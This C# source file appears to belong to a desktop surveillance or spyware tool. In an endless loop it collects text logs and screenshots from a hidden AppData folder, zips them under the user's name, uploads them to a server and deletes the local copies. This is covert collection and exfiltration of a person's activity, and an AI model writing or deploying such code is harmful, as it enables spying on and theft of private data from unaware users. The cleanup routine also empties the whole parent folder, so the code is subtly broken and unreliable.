using System;
using System.Threading.Tasks;
using System.IO;
using System.IO.Compression;

namespace SecProj.Desktop
{
    class FileService
    {
        private static readonly string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\secproj";
        private static readonly string username = Environment.UserName;

        public static async void CompressFile(string folder, string extension)
        {
            string[] filePaths = Directory.GetFiles($"{path}\\{folder}", $"*.{extension}");
            var zipFile = path + $"\\{DateTime.Now:yyyyMMddHHmmss}_{folder}_{username}.zip";

            using (var archive = ZipFile.Open(zipFile, ZipArchiveMode.Create))
            {
                foreach (var fPath in filePaths)
                {
                    archive.CreateEntryFromFile(fPath, Path.GetFileName(fPath));
                }
            }

            ServerClientService.UploadFiles(zipFile);

            string pathToDelete = path + $"\\{folder}";

            if (folder == "screenshots")
            {
                EmptyFolder(Directory.GetParent(pathToDelete));
            }
            
        }

        public static async Task CompressArchive()
        {
            while (true)
            {
                Task delay = Task.Delay(100000);
                await delay;

                if (CheckIfDirExists("logs"))
                {
                    CompressFile("logs", "txt");
                }
                else
                {
                    CreateDir("logs");
                }

                if (CheckIfDirExists("screenshots"))
                {
                    CompressFile("screenshots", "png");
                }
                else
                {
                    CreateDir("screenshots");
                }
            }
        }

        public static void CreateDir(string folder)
        {
            Directory.CreateDirectory(path + $"\\{folder}");
        }

        public static bool CheckIfDirExists(string folder)
        {
            return Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + $"\\secproj\\{folder}");
        }

        private static void EmptyFolder(DirectoryInfo directoryInfo)
        {
            foreach (FileInfo file in directoryInfo.GetFiles())
            {
                file.Delete();
            }

            foreach (DirectoryInfo subfolder in directoryInfo.GetDirectories())
            {
                EmptyFolder(subfolder);
            }
        }
    }
}
